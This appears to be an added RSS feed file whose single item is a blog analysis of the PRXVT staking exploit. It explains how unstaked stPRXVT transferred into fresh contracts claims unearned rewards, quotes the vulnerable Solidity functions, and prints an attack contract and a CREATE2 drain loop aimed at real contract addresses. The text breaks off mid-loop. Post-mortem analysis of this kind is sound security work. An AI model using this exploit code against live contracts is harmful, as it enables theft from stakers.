@@ -1,0 +1,144 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+      <title>Degen - RealWorld</title>
+      <link>https://nogie-dev.github.io</link>
+      <description>Zola + Duckquill</description>
+      <generator>Zola</generator>
+      <language>ko</language>
+      <atom:link href="https://nogie-dev.github.io/tags/realworld/rss.xml" rel="self" type="application/rss+xml"/>
+      <lastBuildDate>Fri, 02 Jan 2026 00:00:00 +0000</lastBuildDate>
+      <item>
+          <title>PRXVT staking exploit analysis</title>
+          <pubDate>Fri, 02 Jan 2026 00:00:00 +0000</pubDate>
+          <author>Unknown</author>
+          <link>https://nogie-dev.github.io/blog/prxvt-staking-exploit-analysis/</link>
+          <guid>https://nogie-dev.github.io/blog/prxvt-staking-exploit-analysis/</guid>
+          <description xml:base="https://nogie-dev.github.io/blog/prxvt-staking-exploit-analysis/">&lt;p&gt;This write-up walks through the PRXVT staking exploit in the order it unfolded, then maps each step back to the vulnerable code paths that made it possible.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;actors-and-contracts&quot;&gt;Actors and contracts&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Attacker EOAs: &lt;code&gt;0x7407f9bdc4140d5e284ea7De32A9De6037842f45&lt;&#x2F;code&gt; (controller&#x2F;beneficiary)&lt;&#x2F;li&gt;
+&lt;li&gt;Attack Controller Contract (ACC): &lt;code&gt;0x702980b1Ed754C214B79192a4D7c39106f19BcE9&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;Attack1 Contract (AC): &lt;code&gt;0x8fA06125249ceCE812E96389758910e32c9B2F89&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;prxvt&#x2F;analy1.png&quot; alt=&quot;Flow overview&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;timeline-of-the-exploit&quot;&gt;Timeline of the exploit&lt;&#x2F;h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;ACC funds AC with stPRXVT&lt;&#x2F;strong&gt;
+&lt;ul&gt;
+&lt;li&gt;ACC transfers &lt;strong&gt;15,000,000 stPRXVT&lt;&#x2F;strong&gt; to AC. No staking call is made; this is just a raw token transfer.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;prxvt&#x2F;analy2.png&quot; alt=&quot;ACC transfers stPRXVT to AC&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;ol start=&quot;2&quot;&gt;
+&lt;li&gt;&lt;strong&gt;AC calls &lt;code&gt;execute()&lt;&#x2F;code&gt; to claim rewards immediately&lt;&#x2F;strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Inside &lt;code&gt;execute()&lt;&#x2F;code&gt;, AC calls &lt;code&gt;claimReward()&lt;&#x2F;code&gt; on the staking contract. Because of how rewards are computed, the contract treats the freshly transferred stPRXVT balance as if it had accrued rewards over time.&lt;&#x2F;li&gt;
+&lt;li&gt;AC receives PRXVT rewards, then transfers both the claimed PRXVT and the stPRXVT back to the attacker&#x2F;ACC.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;prxvt&#x2F;analy3.png&quot; alt=&quot;AC executes claimReward and drains PRXVT&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;ol start=&quot;3&quot;&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Loop and repeat with fresh contracts&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;The attacker deploys fresh Attack contracts (e.g., via different CREATE2 salts), transfers in stPRXVT, calls &lt;code&gt;claimReward()&lt;&#x2F;code&gt;, and drains rewards again. Each new contract starts with &lt;code&gt;userRewardPerTokenPaid = 0&lt;&#x2F;code&gt;, making the reward calculation reset in the attacker’s favor.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Result&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;The attacker accumulates PRXVT. Liquidity was later pulled, making it harder to cash out, but the estimated loss sits around &lt;strong&gt;$97,852.95&lt;&#x2F;strong&gt; based on on-chain balances at the time.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;h2 id=&quot;vulnerable-staking-code&quot;&gt;Vulnerable staking code&lt;&#x2F;h2&gt;
+&lt;p&gt;Reward claiming:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;solidity&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;function&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; claimReward&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt; public&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; nonReentrant whenNotPaused updateReward&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;msg.sender&lt;&#x2F;span&gt;&lt;span&gt;) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    uint256&lt;&#x2F;span&gt;&lt;span&gt; reward &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; rewards[&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;msg.sender&lt;&#x2F;span&gt;&lt;span&gt;];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    require&lt;&#x2F;span&gt;&lt;span&gt;(reward &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color: #2AA198;&quot;&gt; &amp;quot;No rewards to claim&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    rewards[&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;msg.sender&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; =&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    uint256&lt;&#x2F;span&gt;&lt;span&gt; burnAmount &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; (reward &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; burnFeePercent)&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 10_000&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    uint256&lt;&#x2F;span&gt;&lt;span&gt; userAmount &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; reward &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; burnAmount;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    totalBurned &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;+=&lt;&#x2F;span&gt;&lt;span&gt; burnAmount;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    if&lt;&#x2F;span&gt;&lt;span&gt; (burnAmount &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0&lt;&#x2F;span&gt;&lt;span&gt;) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;        prxvtToken.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;safeTransfer&lt;&#x2F;span&gt;&lt;span&gt;(BURN_ADDRESS, burnAmount);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    if&lt;&#x2F;span&gt;&lt;span&gt; (userAmount &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0&lt;&#x2F;span&gt;&lt;span&gt;) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;        prxvtToken.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;safeTransfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;msg.sender&lt;&#x2F;span&gt;&lt;span&gt;, userAmount);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    emit&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; RewardPaid&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;msg.sender&lt;&#x2F;span&gt;&lt;span&gt;, userAmount);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Reward snapshot (modifier) and accrual:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;solidity&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;modifier&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; updateReward&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; account) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    rewardPerTokenStored &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; rewardPerToken&lt;&#x2F;span&gt;&lt;span&gt;();&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    lastUpdateTime &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; lastTimeRewardApplicable&lt;&#x2F;span&gt;&lt;span&gt;();&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    if&lt;&#x2F;span&gt;&lt;span&gt; (account &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;!= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;        rewards[account]&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; =&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; earned&lt;&#x2F;span&gt;&lt;span&gt;(account);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;        userRewardPerTokenPaid[account]&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; =&lt;&#x2F;span&gt;&lt;span&gt; rewardPerTokenStored;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #CB4B16;&quot;&gt;    _&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Core calculation:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;solidity&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;function&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; earned&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; account)&lt;&#x2F;span&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt; public view&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; returns&lt;&#x2F;span&gt;&lt;span&gt; (&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    uint256&lt;&#x2F;span&gt;&lt;span&gt; baseReward &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;        (&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(account)&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; *&lt;&#x2F;span&gt;&lt;span&gt; (&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;rewardPerToken&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; -&lt;&#x2F;span&gt;&lt;span&gt; userRewardPerTokenPaid[account]))&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; &#x2F;&lt;&#x2F;span&gt;&lt;span&gt; PRECISION&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;        +&lt;&#x2F;span&gt;&lt;span&gt; rewards[account];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    BoostInfo &lt;&#x2F;span&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;storage&lt;&#x2F;span&gt;&lt;span&gt; boost &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _boosts[account];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    if&lt;&#x2F;span&gt;&lt;span&gt; (boost.expiresAt &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; block&lt;&#x2F;span&gt;&lt;span&gt;.timestamp &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; boost.multiplier &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; PRECISION) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;        return&lt;&#x2F;span&gt;&lt;span&gt; (baseReward &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; boost.multiplier)&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; &#x2F;&lt;&#x2F;span&gt;&lt;span&gt; PRECISION;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    return&lt;&#x2F;span&gt;&lt;span&gt; baseReward;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h3 id=&quot;why-the-reward-calculation-was-abusable&quot;&gt;Why the reward calculation was abusable&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;On a fresh address&#x2F;contract, &lt;code&gt;userRewardPerTokenPaid[account]&lt;&#x2F;code&gt; is &lt;code&gt;0&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;balanceOf(account)&lt;&#x2F;code&gt; reflects any stPRXVT the account currently holds, even if received via &lt;code&gt;transfer&lt;&#x2F;code&gt; and never staked.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;earned()&lt;&#x2F;code&gt; therefore returns &lt;code&gt;balanceOf(account) * rewardPerToken() &#x2F; 1e18&lt;&#x2F;code&gt; on first call. The staking contract has no knowledge of &lt;em&gt;when&lt;&#x2F;em&gt; or &lt;em&gt;how&lt;&#x2F;em&gt; the stPRXVT arrived.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;claimReward()&lt;&#x2F;code&gt; simply pays out &lt;code&gt;rewards[msg.sender]&lt;&#x2F;code&gt; after &lt;code&gt;updateReward&lt;&#x2F;code&gt; snapshots this calculation.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;The attacker exploited this by transferring in stPRXVT to new contracts that had never participated in staking, immediately invoking &lt;code&gt;claimReward()&lt;&#x2F;code&gt;, and withdrawing the unearned PRXVT rewards.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;attack-contract-mechanics-foundry-test-excerpt&quot;&gt;Attack contract mechanics (foundry test excerpt)&lt;&#x2F;h2&gt;
+&lt;p&gt;The exploit test mirrors on-chain behavior:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;solidity&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color: #CB4B16;&quot;&gt; Attack&lt;&#x2F;span&gt;&lt;span&gt; {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    address&lt;&#x2F;span&gt;&lt;span&gt; prxvtStaking &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0xDAc30a5e2612206E2756836Ed6764EC5817e6Fff&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    address&lt;&#x2F;span&gt;&lt;span&gt; stPRXVT &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0xDAc30a5e2612206E2756836Ed6764EC5817e6Fff&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    address&lt;&#x2F;span&gt;&lt;span&gt; PRXVT &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0xC2FF2E5aa9023b1bb688178a4a547212f4614bc0&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    address&lt;&#x2F;span&gt;&lt;span&gt; attacker &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0x7407f9bdc4140d5e284ea7De32A9De6037842f45&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;    function&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; execute&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt; external&lt;&#x2F;span&gt;&lt;span&gt; {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;        IExploit&lt;&#x2F;span&gt;&lt;span&gt;(prxvtStaking).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;claimReward&lt;&#x2F;span&gt;&lt;span&gt;();&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;        uint256&lt;&#x2F;span&gt;&lt;span&gt; claimed &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; IExploit&lt;&#x2F;span&gt;&lt;span&gt;(PRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;));&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;        IExploit&lt;&#x2F;span&gt;&lt;span&gt;(PRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(attacker, claimed);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;        IExploit&lt;&#x2F;span&gt;&lt;span&gt;(stPRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(attacker,&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; IExploit&lt;&#x2F;span&gt;&lt;span&gt;(stPRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)));&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And the loop that drives it:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;solidity&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt; (&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; i; i &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 20&lt;&#x2F;span&gt;&lt;span&gt;; i&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    bytes32&lt;&#x2F;span&gt;&lt;span&gt; salt &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(i));&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    Attack a1 &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;= new&lt;&#x2F;span&gt;&lt;span&gt; Attack{salt&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt; salt}();&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
